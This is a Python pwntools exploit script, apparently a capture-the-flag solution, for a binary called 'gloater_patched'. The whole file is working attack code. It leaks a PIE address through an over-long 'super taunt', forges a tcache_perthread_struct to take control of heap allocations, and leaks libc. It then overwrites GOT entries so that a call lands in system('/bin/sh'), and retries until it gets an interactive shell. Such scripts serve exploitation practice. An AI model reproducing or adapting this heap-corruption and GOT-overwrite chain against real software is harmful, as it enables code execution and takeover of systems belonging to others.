from pwn import *
from time import sleep 

if args.LOCAL:
    io = process('./gloater_patched')
    if args.GDB:
        cmd="""
        b* create_taunt+128
        b* set_super_taunt+228
        """
        gdb.attach(io, cmd)

    
elf=ELF('./gloater_patched')
libc=ELF('./libc.so.6')
def change_user(new_user):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'New User: ', new_user)
    sleep(0.1)
    
def create_taunt(target, taunt):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Taunt target: ', target)
    io.sendlineafter(b'Taunt: ', taunt)
    sleep(0.1)
    
def remove_taunt(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    sleep(0.1)
    
def send_taunts():
    io.sendlineafter(b'> ', b'4')
    sleep(0.1)
    
def set_super_taunt(idx, super_taunt):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index for Super Taunt: ', str(idx).encode())
    io.sendafter(b' super taunt: ', super_taunt)
    sleep(0.1)
    
def exit_():
    io.sendlineafter(b'> ', b'6')
    sleep(0.1)

while(True):
    try:
        io = process('./gloater_patched')
        user = b'duy'

        io.send(user)
        sleep(0.1)

        create_taunt(b'duy', b'A'*7)
        create_taunt(b'duy', b'/bin/sh\0')
        set_super_taunt(0, b'A'*0x30)
        io.recvuntil(b'A'*0x30)

        pie = u64(io.recv(6)+b'\0\0') - 0x40
        elf.address = pie
        print(hex(pie)) 
        change_user(p32(0xdeadbeef)+p8(0x10)+p8(0x90))

        remove_taunt(0)

        user_change = pie+0x4180
        tcache_pthread_struct = p8(0)+p8(0x1)+p8(0x0)+p8(0x0)+p8(0x1) + \
            (0x80-5)*b'\0'+ \
            p64(user_change) + \
            p64(user_change) + \
            p64(pie+0x4018)
        create_taunt(b'PLAYER FROM THE FACTIONLESS ', tcache_pthread_struct.ljust(0x280, b'\0'))

        create_taunt(b'\0'*0x10, b'\0'*0x10)

        set_super_taunt(1, b'A'*0x60)
        io.recvuntil(b'A'*0x60)
        libc.address = u64(io.recv(6)+b'\0\0') - 0x1f12e8
        print(hex(libc.address))

        hehe =  p64(libc.sym.system)+ \
            p64(elf.plt.strncpy+6) + \
            p64(elf.plt.printf+6)+ \
            p64(elf.plt.memset+6) + \
            p64(elf.plt.alarm+6) + \
            p64(elf.plt.read+6)
            
        create_taunt(b'\0'*0x10, hehe)
        remove_taunt(1)    
        try:
            io.sendline(b'ls')
            io.interactive(prompt="# ")
            exit(1)
        except KeyboardInterrupt:
            exit(1)
        except:
            pass
            
    except:
        io.close()
        continue